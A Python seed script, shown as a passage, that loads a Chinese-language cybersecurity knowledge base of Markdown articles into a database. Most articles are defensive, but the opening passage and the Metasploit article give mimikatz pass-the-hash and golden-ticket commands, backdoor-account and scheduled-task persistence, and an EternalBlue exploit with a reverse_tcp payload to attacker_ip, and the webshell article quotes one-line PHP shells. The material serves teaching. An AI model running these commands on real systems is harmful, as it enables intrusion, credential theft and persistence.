利用NTLM哈希直接认证，无需明文密码。
```bash
mimikatz sekurlsa::pth /user:admin /ntlm:hash /domain:target.com
```

### 2. Pass the Ticket
窃取Kerberos票据进行认证。
```bash
mimikatz sekurlsa::tickets /export
```

### 3. 远程服务利用
```bash
psexec.py target.com/admin@target_server
wmiexec.py target.com/admin@target_server
```

## 权限维持

### 1. 创建后门账户
```bash
net user hacker password /add
net localgroup Administrators hacker /add
```

### 2. 计划任务后门
```bash
schtasks /create /sc minute /mo 1 /tn "Update" /tr "payload"
```

### 3. 服务后门
将恶意程序注册为Windows服务。

## 票据伪造

### Golden Ticket
伪造TGT，获取任意用户权限。
```bash
mimikatz kerberos::golden /user:admin /domain:target.com /sid:S-1-5-21 /krbtgt:hash
```

### Silver Ticket
伪造TGS，访问特定服务。""",
                "difficulty": "hard",
                "source": "内网渗透",
                "tags": ["内网渗透", "横向移动", "权限维持"]
            },
            {
                "title": "Metasploit渗透框架",
                "summary": "Metasploit框架使用与模块开发",
                "content": """# Metasploit渗透框架

## 基本命令

```bash
msfconsole
search exploit_name
use exploit_path
show options
set PAYLOAD payload_name
set RHOST target_ip
exploit
```

## 模块类型

| 模块 | 说明 |
|------|------|
| auxiliary | 辅助模块（扫描、嗅探） |
| exploit | 漏洞利用模块 |
| payload | 攻击载荷 |
| post | 后渗透模块 |
| encoder | 编码器 |
| nop | 空操作生成器 |

## 漏洞利用示例

### MS17-010（永恒之蓝）
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit
```

## Meterpreter常用命令

```bash
# 获取系统信息
sysinfo

# 获取密码哈希
hashdump

# 截图
screenshot

# 开启远程桌面
run getgui -e

# 权限提升
getsystem
```""",
                "difficulty": "hard",
                "source": "渗透工具",
                "tags": ["Metasploit", "渗透框架", "漏洞利用"]
            }
        ]
    },

    # ============================================
    # 分类6：应急响应
    # ============================================
    "应急响应": {
        "description": "安全事件响应与取证分析",
        "items": [
            {
                "title": "应急响应流程",
                "summary": "安全事件响应的标准流程和方法",
                "content": """# 应急响应流程

## PDCERF模型

1. **准备阶段（Preparation）**
2. **检测阶段（Detection & Analysis）**
3. **遏制阶段（Containment）**
4. **根除阶段（Eradication）**
5. **恢复阶段（Recovery）**
6. **事后阶段（Follow-up）**

## 检测与分析

### 确定事件类型
- **恶意代码**：病毒、蠕虫、木马
- **Web攻击**：SQL注入、XSS、webshell
- **网络攻击**：DDoS、中间人
- **数据泄露**：拖库、删库

### 收集证据
```bash
# 系统日志
/var/log/auth.log      # SSH登录
/var/log/secure         # 安全日志

# 网络连接
netstat -tunap

# 进程信息
ps aux
```

## 遏制阶段

### 临时遏制
- 断网隔离
- 关闭服务
- 阻止攻击IP
- 禁用账户

## 根除阶段

- 清除恶意文件
- 删除后门账户
- 修复配置
- 重建系统（严重时）""",
                "difficulty": "hard",
                "source": "应急响应指南",
                "tags": ["应急响应", "取证", "事件分析"]
            },
            {
                "title": "恶意软件分析基础",
                "summary": "恶意软件分析方法和工具",
                "content": """# 恶意软件分析基础

## 分析环境

- 虚拟机隔离（VirtualBox/VMware）
- 沙箱（Cuckoo、Any.Run）
- 必备工具（IDA Pro、Ghidra、Wireshark）

## 静态分析

### 文件分析
```bash
file malware.exe
md5sum malware.exe
strings malware.exe
```

### PE文件分析
```bash
dumpbin /IMPORTS malware.exe
```

## 动态分析

### 行为监控
- Process Monitor
- Process Explorer
- Wireshark

### 调试分析
```bash
x64dbg.exe malware.exe
```

## 常见恶意软件类型

1. **勒索软件（Ransomware）**
2. **木马（Trojan）**
3. **蠕虫（Worm）**
4. **挖矿软件（Cryptominer）**""",
                "difficulty": "hard",
                "source": "恶意软件分析",
                "tags": ["恶意软件", "逆向分析", "沙箱"]
            },
            {
                "title": "WebShell检测与清除",
                "summary": "WebShell特征分析与安全处置",
                "content": """# WebShell检测与清除

## WebShell特征

### PHP WebShell
```php
<?php system($_GET['cmd']); ?>
<?php eval($_POST['x']); ?>
<?php assert($_REQUEST['cmd']); ?>
```

### 常见特征
- 特殊函数调用（system、exec、eval、assert）
- base64编码内容
- 隐藏技术（文件伪装、图片伪装）
- 变形技术

## 检测方法

### 1. 静态特征检测
```bash
# 查找可疑PHP文件
find /var/www -name "*.php" -mtime -1
grep -r "eval|base64_decode|system|exec" /var/www/

# 使用D盾
python ant_webshell.py /var/www
```

### 2. 流量分析
- 检测异常外网连接
- 分析POST请求特征

### 3. 日志分析
```bash
# 查找异常请求
grep -E "\\.php\\?.*=.{50,}" access.log
```

## 清除流程

1. 确认WebShell位置
2. 分析入侵路径
3. 清除所有WebShell文件
4. 修复漏洞入口
5. 加强安全配置
6. 持续监控""",
                "difficulty": "hard",
                "source": "Web安全运维",
                "tags": ["WebShell", "webshell", "安全运维"]
            },
            {
                "title": "日志分析溯源",
                "summary": "安全日志分析与攻击溯源方法",
                "content": """# 日志分析溯源

## 关键日志位置

### Linux
```
/var/log/auth.log       # 认证日志
/var/log/secure         # 安全日志
/var/log/apache2/       # Web日志
/var/log/nginx/          # Nginx日志
/var/log/messages        # 系统消息
```

### Windows
```
C:\\Windows\\System32\\winevt\\Logs\\
- Security.evtx     # 安全事件
- System.evtx       # 系统事件
- Application.evtx # 应用事件
```

## 常用分析命令

### SSH暴力破解
```bash
grep "Failed password" /var/log/auth.log
grep "Accepted" /var/log/auth.log
```

### Web攻击检测
```bash
# 查找SQL注入
grep -E "union|select|exec" access.log

# 查找扫描行为
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -20
```

### 异常登录
```bash
# 非正常时间登录
grep -E "([0-2][0-9]:[0-5][0-9])" auth.log

# 异地登录
lastlog | grep -v "Never"
```

## 溯源方法

1. **时间线重构**：按时间顺序排列事件
2. **攻击链分析**：Kill Chain模型
3. **关联分析**：多源日志关联
4. **IoC匹配**：威胁情报比对""",
                "difficulty": "hard",
                "source": "安全运维",
                "tags": ["日志分析", "溯源", "取证"]
            }
        ]
    },

    # ============================================
    # 分类7：数据安全
    # ============================================
    "数据安全": {
        "description": "数据加密、脱敏与隐私保护",
        "items": [
            {
                "title": "数据加密与脱敏技术",
                "summary": "数据保护的各种加密和脱敏方法",
                "content": """# 数据加密与脱敏技术

## 数据加密

### 透明数据加密（TDE）
对整个数据库或文件进行加密。

### 列级加密
```python
from cryptography.fernet import Fernet
key = Fernet.generate_key()
cipher = Fernet(key)
encrypted = cipher.encrypt(b"敏感数据")
```

## 数据脱敏

### 静态脱敏

| 方法 | 示例 | 用途 |
|------|------|------|
| 掩码 | 1234****5678 | 展示 |
| 替换 | 真实值→假值 | 测试 |
| 打乱 | 随机排序 | 分析 |
| 截断 | 138****5678 | 手机号 |

### 手机号脱敏
```python
def mask_phone(phone):
    if len(phone) == 11:
        return phone[:3] + '****' + phone[-4:]
    return phone
```

### 身份证脱敏
```python
def mask_id_card(id_card):
    if len(id_card) >= 15:
        return id_card[:6] + '********' + id_card[-4:]
    return id_card
```

## 隐私保护法规

- **GDPR**：欧盟通用数据保护条例
- **《个人信息保护法》**：中国个人信息保护法
- **《数据安全法》**：中国数据安全法""",
                "difficulty": "medium",
                "source": "数据安全",
                "tags": ["数据加密", "脱敏", "隐私保护"]
            },
            {
                "title": "数据库安全",
                "summary": "数据库安全配置与防护措施",
                "content": """# 数据库安全

## MySQL安全

### 1. 最小权限原则
```sql
GRANT SELECT, INSERT ON app_db.* TO 'app_user'@'localhost';
REVOKE DELETE, DROP ON app_db.* FROM 'app_user'@'localhost';
```

### 2. 密码策略
```sql
SET GLOBAL validate_password_policy=MEDIUM;
SET GLOBAL validate_password_length=12;
```

### 3. 安全配置
```ini
# my.cnf
bind-address = 127.0.0.1
local_infile = 0
skip_show_database = 1
```

## SQL注入防护

1. 使用参数化查询
2. 输入验证
3. 错误信息隐藏
4. 定期更新

## 数据库审计

```sql
-- 启用查询审计
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/query.log';
```

## 备份安全

- 加密备份文件
- 离线存储
- 定期测试恢复""",
                "difficulty": "medium",
                "source": "数据库安全",
                "tags": ["数据库", "MySQL", "安全加固"]
            },
            {
                "title": "云存储安全",
                "summary": "云存储服务的安全配置",
                "content": """# 云存储安全

## AWS S3安全

### 1. 桶策略
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "PublicReadGetObject",
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::bucket/*"
  }]
}
```

### 2. 访问控制
- IAM策略
- Bucket ACL
- 对象ACL

### 3. 加密
- 服务端加密（SSE-S3、SSE-KMS）
- 客户端加密

## 常见风险

1. **公开访问桶**：导致数据泄露
2. **弱权限配置**：过度授权
3. **日志配置不当**：审计缺失
4. **未加密传输**：中间人攻击

## 安全建议

1. 启用 versioning
2. 启用访问日志
3. 配置生命周期策略
4. 启用加密
5. 使用IAM角色而非Access Key
6. 定期安全审计""",
                "difficulty": "medium",
                "source": "云安全",
                "tags": ["云存储", "AWS", "S3", "云安全"]
            }
        ]
    },

    # ============================================
    # 分类8：移动安全
    # ============================================
    "移动安全": {
        "description": "移动应用安全与加固技术",
        "items": [
            {
                "title": "Android应用安全分析",
                "summary": "Android应用安全漏洞与防护措施",
                "content": """# Android应用安全分析

## 反编译防护

### 混淆技术
```gradle
android {
    buildTypes.release {
        minifyEnabled true
        proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
    }
}
```

### 反调试检测
```java
boolean isDebuggable = (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;

// 检测Frida
public static boolean isFridaRunning() {
    File[] files = new File("/proc").listFiles();
    for (File file : files) {
        if (file.isDirectory()) {
            if (new FileInputStream(file.getAbsolutePath() + "/cmdline").read().toString().contains("frida")) {
                return true;
            }
        }
    }
    return false;
}
```

## 数据安全

### 安全存储
```java
MasterKey masterKey = new MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build();

SharedPreferences prefs = EncryptedSharedPreferences.create(context, "secure_prefs", masterKey);
```""",
                "difficulty": "medium",
                "source": "移动安全",
                "tags": ["Android", "移动安全", "混淆"]
            },
            {
                "title": "iOS应用安全机制",
                "summary": "iOS应用安全特性与防护方法",
                "content": """# iOS应用安全机制

## 代码签名

iOS要求所有应用必须经过Apple签名才能安装。

## 安全特性

### Data Protection API
```swift
let fileManager = FileManager.default
try fileManager.setAttributes(
    [.protectionKey: FileProtectionType.complete],
    ofItemAtPath: "sensitive_data.txt"
)
```

### Keychain安全
```swift
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "username",
    kSecValueData as String: "password".data(using: .utf8)!,
    kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
]
```

## 加固建议

1. 启用ATS（App Transport Security）
2. 使用TestFlight进行测试
3. 定期更新安全补丁
4. 代码混淆保护知识产权""",
                "difficulty": "medium",
                "source": "移动安全",
                "tags": ["iOS", "移动安全", "代码签名"]
            },
            {
                "title": "移动端渗透测试",
                "summary": "移动应用安全测试方法与工具",
                "content": """# 移动端渗透测试

## 测试工具

| 工具 | 平台 | 用途 |
|------|------|------|
| Jadx | Android | APK反编译 |
| Frida | 跨平台 | 动态插桩 |
| Objection | 跨平台 | 运行时分析 |
| Drozer | Android | 安全评估 |
| MobSF | 跨平台 | 自动化扫描 |

## Android测试

### 1. 反编译APK
```bash
jadx -d output app.apk
```

### 2. 动态分析
```bash
frida -U -f com.target.app -l script.js
```

### 3. 网络抓包
```bash
# 配置代理
adb shell settings put global http_proxy localhost:8080
```

## iOS测试

### 1. 砸壳（App Store应用）
```bash
 clutch -d bundle_id
```

### 2. 动态分析
```bash
frida -U -f com.target.app
```

### 3. SSL Pinning绕过
```javascript
// Objection
android sslpinning disable
```""",
                "difficulty": "hard",
                "source": "移动安全",
                "tags": ["移动渗透", "Frida", "Android", "iOS"]
            }
        ]
    },

    # ============================================
    # 分类9：信息收集
    # ============================================
    "信息收集": {
        "description": "渗透测试前期的信息侦察技术",
        "items": [
            {
                "title": "网络空间搜索引擎利用",
                "summary": "使用Shodan、Censys等搜索引擎发现资产",
                "content": """# 网络空间搜索引擎利用

## Shodan

### 基本用法
```bash
shodan search port:22 country:cn
shodan search 'product:"Apache"'
shodan search vuln:cve-2021-44228
```

### API使用
```python
import shodan
api = shodan.API('YOUR_API_KEY')
results = api.search('apache')
host = api.host('8.8.8.8')
```

## Censys

### 查询语法
```
443.https.get.headers.server: Apache
443.https.tls.certificates.leaf_data.subject.common_name: example.com
```

## FOFA（国内）

```bash
app="Apache"
region="China"
```

## 搜索技巧

1. **端口筛选**：port:22, port:80, port:443
2. **地理位置**：country:CN, city:Beijing
3. **服务类型**：product:"nginx"
4. **漏洞关联**：vuln:CVE-2021-xxxx""",
                "difficulty": "medium",
                "source": "渗透测试",
                "tags": ["Shodan", "信息收集", "侦察"]
            },
            {
                "title": "GitHub敏感信息泄露",
                "summary": "发现GitHub上泄露的敏感信息",
                "content": """# GitHub敏感信息泄露

## 常见泄露类型

1. **API密钥**
   - AWS keys: AKIA...
   - Google API keys: AIza...
   - Stripe keys: sk_live...

2. **凭据**
   - 数据库连接字符串
   - SMTP认证信息
   - SSH密钥

3. **配置文件**
   - .env文件
   - config.py
   - settings.xml

## GitHub搜索语法

```bash
filename:.env DB_PASSWORD
extension:.pem private
"aws_access_key" language:YAML
```

## 检测工具

### truffleHog
```bash
trufflehog https://github.com/user/repo
```

### gitGraber
```bash
gitGraber -k wordlists/keywords.txt -q "company_name"
```

## 防护措施

1. **使用GitHub Secret Scanning**
2. **配置 .gitignore**
3. **员工安全培训**
4. **定期审计代码仓库**""",
                "difficulty": "medium",
                "source": "安全运维",
                "tags": ["GitHub", "信息泄露", "密钥安全"]
            },
            {
                "title": "DNS信息收集技术",
                "summary": "DNS记录的查询与利用方法",
                "content": """# DNS信息收集技术

## DNS查询工具

### dig命令
```bash
dig example.com
dig +trace example.com
dig example.com MX
dig example.com AXFR
```

### dnsenum
```bash
dnsenum example.com
```

## 子域名发现

### 被动收集
```bash
curl -s "https://crt.sh/?q=%.example.com"
amass enum -passive -d example.com
```

### 主动扫描
```bash
gobuster dns -d example.com -w wordlist.txt
ffuf -w wordlist.txt -u https://FUZZ.example.com
```

## DNS区域传送

### 检测
```bash
dig @ns1.example.com example.com AXFR
```

## DNS数据利用

1. 建立目标资产清单
2. 发现隐藏服务
3. 识别CDN和WAF
4. 社工攻击面分析""",
                "difficulty": "medium",
                "source": "渗透测试",
                "tags": ["DNS", "子域名", "信息收集"]
            },
            {
                "title": "社会工程学信息收集",
                "summary": "利用社工技巧收集目标信息",
                "content": """# 社会工程学信息收集

## OSINT公开情报收集

### 1. 搜索引擎
- Google Hacking
- 百度高级搜索
- 钟馗之眼（Zoomeye）

### 2. 社交媒体
- LinkedIn：人员信息、公司结构
- Twitter：员工动态、技术栈
- Facebook：公司活动

### 3. 数据泄露查询
- HaveIBeenPwned：邮箱泄露
- DeHashed：密码泄露

## Google Hacking

### 常用语法
```
site:example.com filetype:pdf
site:example.com intitle:"管理后台"
site:example.com inurl:login
site:example.com ext:php OR ext:jsp
```

### 数据库文件
```
site:example.com filetype:sql
site:example.com filetype:log
```

### 敏感文件
```
site:example.com filetype:inc
site:example.com "password" filetype:txt
```

## 社工防护

1. 员工安全意识培训
2. 敏感信息最小化公开
3. 邮箱过滤敏感内容
4. 钓鱼演练""",
                "difficulty": "easy",
                "source": "社会工程学",
                "tags": ["OSINT", "社工", "信息收集"]
            }
        ]
    },

    # ============================================
    # 分类10：Web安全
    # ============================================
    "Web安全": {
        "description": "Web应用安全深度分析",
        "items": [
            {
                "title": "身份认证安全",
                "summary": "身份认证机制的安全问题与会话管理",
                "content": """# 身份认证安全

## 认证机制

### 1. 密码认证
- 密码复杂度要求
- 密码加密存储（bcrypt、scrypt）
- 密码找回流程安全

### 2. 多因素认证（MFA）
- 短信验证码
- 邮箱验证码
- TOTP（Google Authenticator）
- 硬件令牌

### 3. 第三方认证
- OAuth 2.0
- SAML
- OpenID Connect

## 会话管理

### 会话ID安全
- 使用加密的随机数
- 足够长度（128位）
- 设置HttpOnly和Secure

### 会话超时
```http
Session: timeout=15分钟
```

## 安全问题

1. **暴力破解**：无登录失败限制
2. **弱密码**：简单密码被猜测
3. **会话固定**：未更换会话ID
4. **CSRF**：缺少Token验证
5. **XSS**：窃取Cookie

## 最佳实践

1. 强制密码复杂度
2. 登录失败锁定
3. 定期会话刷新
4. 多因素认证
5. 安全的密码重置""",
                "difficulty": "medium",
                "source": "Web安全",
                "tags": ["身份认证", "会话管理", "MFA"]
            },
            {
                "title": "API安全",
                "summary": "API安全漏洞与防护策略",
                "content": """# API安全

## REST API安全

### 1. 认证
- API Key
- JWT Token
- OAuth 2.0

### 2. 授权
```python
@app.route('/api/admin')
@require_admin
def admin_panel():
    pass
```

### 3. 输入验证
```python
from marshmallow import Schema, validate

class UserSchema(Schema):
    email = fields.Email(required=True)
    age = fields.Int(validate=Range(min=0, max=150))
```

## 常见漏洞

### 1. 越权访问
- 水平越权：同级用户互访
- 垂直越权：低权限访问高权限

### 2. 批量枚举
- 用户ID遍历
- 订单号遍历

### 3. 速率限制缺失
导致暴力破解或数据爬取。

## 防护措施

1. 实施速率限制
2. 强制身份认证
3. 资源级别授权
4. 输入输出验证
5. 敏感数据脱敏
6. API版本管理""",
                "difficulty": "medium",
                "source": "API安全",
                "tags": ["API", "REST", "安全"]
            },
            {
                "title": "内容安全策略CSP",
                "summary": "CSP配置与XSS防护",
                "content": """# 内容安全策略CSP

## CSP作用

Content Security Policy是一种安全头部，用于防止XSS、点击劫持等攻击。

## 配置示例

### 基本配置
```http
Content-Security-Policy: default-src 'self'
```

### 允许特定源
```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src *;
```

### 禁止内联
```http
Content-Security-Policy: script-src 'self'
```

## 指令说明

| 指令 | 说明 |
|------|------|
| default-src | 默认来源 |
| script-src | JS来源 |
| style-src | CSS来源 |
| img-src | 图片来源 |
| connect-src | AJAX/WebSocket |
| frame-src | iframe来源 |

## 报告机制

```http
Content-Security-Policy-Report-URI: /csp-report
```

## 常见错误

1. **'unsafe-inline'**：允许内联脚本
2. **'*'**：允许任意来源
3. **data:**：允许data:URL""",
                "difficulty": "medium",
                "source": "Web安全",
                "tags": ["CSP", "XSS", "安全头部"]
            },
            {
                "title": "点击劫持与防护",
                "summary": "点击劫持攻击原理与防御方法",
                "content": """# 点击劫持与防护

## 攻击原理

攻击者通过iframe嵌入目标网站，诱导用户点击隐藏的恶意元素。

```html
<iframe src="http://target-bank.com/transfer?to=hacker&amount=10000">
  <button style="opacity:0">确认转账</button>
</iframe>
```

## 攻击类型

### 1. 经典点击劫持
诱骗用户点击隐藏按钮。

### 2. likejacking
Facebook点赞劫持。

### 3. 鼠标灾难
移动鼠标时触发隐藏操作。

## 防御措施

### 1. X-Frame-Options
```http
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://trusted.com
```

### 2. CSP Frame-Ancestors
```http
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors https://trusted.com
```

### 3. JavaScript防御
```javascript
if (top.location !== self.location) {
    top.location = self.location;
}
```

## 最佳实践

1. 优先使用CSP frame-ancestors
2. 两者结合双重防护
3. 敏感操作添加确认步骤
4. 避免单点击操作完成重要事务""",
                "difficulty": "easy",
                "source": "Web安全",
                "tags": ["点击劫持", "X-Frame-Options", "UI伪装"]
            },
            {
                "title": "Web缓存安全",
                "summary": "Web缓存机制与安全问题",
                "content": """# Web缓存安全

## 缓存机制

### 1. 浏览器缓存
- Cache-Control
- Expires
- ETag
- Last-Modified

### 2. CDN缓存
- 边缘节点缓存
- 私有缓存

### 3. 反向代理缓存
- Nginx缓存
- Varnish

## 安全问题

### 1. 敏感数据泄露
- 缓存敏感页面（账户信息）
- 缓存包含认证Token的响应

### 2. 缓存中毒
攻击者控制缓存内容。

### 3. 缓存穿透
攻击大量不存在的数据绕过缓存。

## 安全配置

### Cache-Control头
```http
# 不缓存
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

# 私有缓存
Cache-Control: private

# 公共资源，可缓存
Cache-Control: public, max-age=3600
```

### 敏感数据处理
```http
Cache-Control: no-store
Set-Cookie: session=xxx; HttpOnly; Secure
```""",
                "difficulty": "medium",
                "source": "Web安全",
                "tags": ["缓存", "Web安全", "HTTP"]
            }
        ]
    }
}


def import_knowledge():
    """导入网络安全知识数据"""
    app = create_app()

    with app.app_context():
        # 查找管理员账户作为作者
        admin = User.query.filter_by(role_id=1).first()
        if not admin:
            admin = User.query.first()
        if not admin:
            print("未找到用户，请先创建用户")
            return

        total_categories = 0
        total_items = 0

        for category_name, category_data in CATEGORIES_AND_ITEMS.items():
            # 创建或获取分类
            category = Category.query.filter_by(name=category_name).first()
            if not category:
                category = Category(
                    name=category_name,
                    description=category_data["description"],
                    sort_order=list(CATEGORIES_AND_ITEMS.keys()).index(category_name)
                )
                db.session.add(category)
                db.session.commit()
                print(f"创建分类: {category_name}")
            else:
                print(f"分类已存在: {category_name}")

            total_categories += 1

            # 添加知识条目
            for item_data in category_data["items"]:
                # 检查是否已存在
                existing = KnowledgeItem.query.filter_by(
                    title=item_data["title"],
                    category_id=category.id
                ).first()

                if existing:
                    # 更新已存在的条目
                    existing.summary = item_data["summary"]
                    existing.content = item_data["content"]
                    existing.difficulty = item_data.get("difficulty", "medium")
                    existing.source = item_data.get("source", "网络安全知识库")
                    existing.status = "published"
                    print(f"  更新: {item_data['title']}")
                    continue

                item = KnowledgeItem(
                    title=item_data["title"],
                    summary=item_data["summary"],
                    content=item_data["content"],
                    category_id=category.id,
                    difficulty=item_data.get("difficulty", "medium"),
                    source=item_data.get("source", "网络安全知识库"),
                    author_id=admin.id,
                    status="published"
                )
                db.session.add(item)
                db.session.commit()

                # 添加标签（忽略已存在的）
                for tag_name in item_data.get("tags", []):
                    existing_tag = KnowledgeTag.query.filter_by(
                        knowledge_id=item.id,
                        tag_name=tag_name
                    ).first()
                    if not existing_tag:
                        tag = KnowledgeTag(
                            knowledge_id=item.id,
                            tag_name=tag_name
                        )
                        db.session.add(tag)
                db.session.commit()

                print(f"  添加: {item_data['title']}")
                total_items += 1

        print(f"\n导入完成！共处理 {total_categories} 个分类，新增 {total_items} 个知识条目")


if __name__ == "__main__":
    print("开始导入网络安全知识数据（完整版）...")
    print("=" * 50)
    import_knowledge()
